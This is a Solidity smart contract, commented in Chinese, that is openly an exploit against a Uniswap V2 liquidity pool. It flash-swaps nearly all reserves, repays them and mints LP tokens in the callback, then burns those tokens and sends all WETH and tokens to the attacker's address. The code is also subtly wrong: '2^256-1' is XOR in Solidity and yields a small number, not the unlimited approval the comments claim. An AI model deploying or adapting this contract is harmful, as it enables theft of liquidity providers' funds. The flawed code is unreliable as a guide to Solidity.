pragma solidity ^0.8.0;

import {IUniswapV2Pair} from "../contracts/core/interfaces/IUniswapV2Pair.sol"; // 导入Uniswap V2交易对接口
import {IERC20} from "../contracts/core/interfaces/IERC20.sol"; // 导入ERC20标准接口

contract ExploitUniswapV2{
    IUniswapV2Pair uniswapV2Pair; // Uniswap V2交易对
    IERC20 weth; // 代表WETH代币的ERC20接口
    IERC20 token; // 另一种代币的ERC20接口
    IERC20 LPToken; // Uniswap V2交易对的流动性代币
    address public attacker; // 攻击者的地址
    address public uniswapV2PairAddress; // Uniswap V2交易对的地址
    address public wethAddress; // WETH代币的地址
    address public tokenAddress; // 另一种代币的地址

    constructor(address _uniswapV2Pair,address _weth,address _token) {
        weth=IERC20(_weth); // 初始化WETH代币接口
        token=IERC20(_token); // 初始化另一种代币接口
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair); // 初始化Uniswap V2交易对
        uniswapV2PairAddress=_uniswapV2Pair; // 设置Uniswap V2交易对地址
        wethAddress=_weth; // 设置WETH代币地址
        tokenAddress=_token; // 设置另一种代币地址
        LPToken=IERC20(_uniswapV2Pair); // 初始化Uniswap V2交易对的流动性代币接口
        attacker = msg.sender; // 设置攻击者地址为创建合约的地址
        weth.approve(attacker,2^256-1); // 批准攻击者无限额转账WETH
        token.approve(attacker,2^256-1); // 批准攻击者无限额转账另一种代币
        weth.approve(uniswapV2PairAddress,2^256-1); // 批准Uniswap V2交易对无限额转账WETH
        token.approve(uniswapV2PairAddress,2^256-1); // 批准Uniswap V2交易对无限额转账另一种代币
    }

    function exploit() public payable { // 用以进行利用的公开方法，需要发送一些ETH
        require(msg.sender == attacker, "Not an attacker"); // 仅攻击者可以调用
        payable(wethAddress).call{value:address(this).balance}(abi.encodeWithSignature("deposit()", "")); // 调用WETH合约的deposit方法将ETH转为WETH
        uniswapV2Pair.sync(); // 同步Uniswap V2交易对的储备金
        (uint reserve0,uint reserve1,uint blocktimestamp)=uniswapV2Pair.getReserves(); // 获取Uniswap V2交易对的储备金和时间戳
        uniswapV2Pair.swap(reserve0-1, reserve1-1, address(this), "attack"); // 在Uniswap V2交易对中进行交易
    }

    //攻击思路为，用闪电贷拿来的钱来mint LP Token，获取大量的LP，且闪电贷的钱同时也还了，然后移除流动性，获取池子中更多的代币
    function uniswapV2Call(
        address, /* sender */
        uint amount0,
        uint amount1,
        bytes calldata /* data */
    ) external { // Uniswap V2交易对的回调方法
        address token0InPair=uniswapV2Pair.token0(); // 获取Uniswap V2交易对中的第一个代币
        require(msg.sender == uniswapV2PairAddress); // 调用者必须是Uniswap V2交易对
        uniswapV2Pair.sync(); // 同步Uniswap V2交易对的储备金
        if(token0InPair==wethAddress){ // 如果第一个代币是WETH
            weth.transfer(uniswapV2PairAddress, amount0); // 返还WETH
            token.transfer(uniswapV2PairAddress, amount1); // 返还另一种代币
        }
        else{ // 否则
            weth.transfer(uniswapV2PairAddress, amount1); // 返还WETH
            token.transfer(uniswapV2PairAddress, amount0); // 返还另一种代币
        }
        
        uniswapV2Pair.mint(address(this)); // 生成新的流动性代币
        
        if(token0InPair==wethAddress){ // 如果第一个代币是WETH
            weth.transfer(uniswapV2PairAddress, amount0/10); // 返还更多的WETH
        }
        else{ // 否则
            weth.transfer(uniswapV2PairAddress, amount1/10); // 返还更多的WETH
        }
    }

    function withdraw() public{ // 攻击结束后用以提取资金的公开方法
        require(msg.sender==attacker); // 仅攻击者可以调用
        LPToken.transfer(uniswapV2PairAddress,LPToken.balanceOf(address(this))); // 转移所有流动性代币到Uniswap V2交易对
        uniswapV2Pair.burn(address(this)); // 销毁流动性代币
        weth.transfer(attacker,weth.balanceOf(address(this))); // 提取所有WETH到攻击者地址
        token.transfer(attacker,token.balanceOf(address(this))); // 提取所有另一种代币到攻击者地址
    }
}
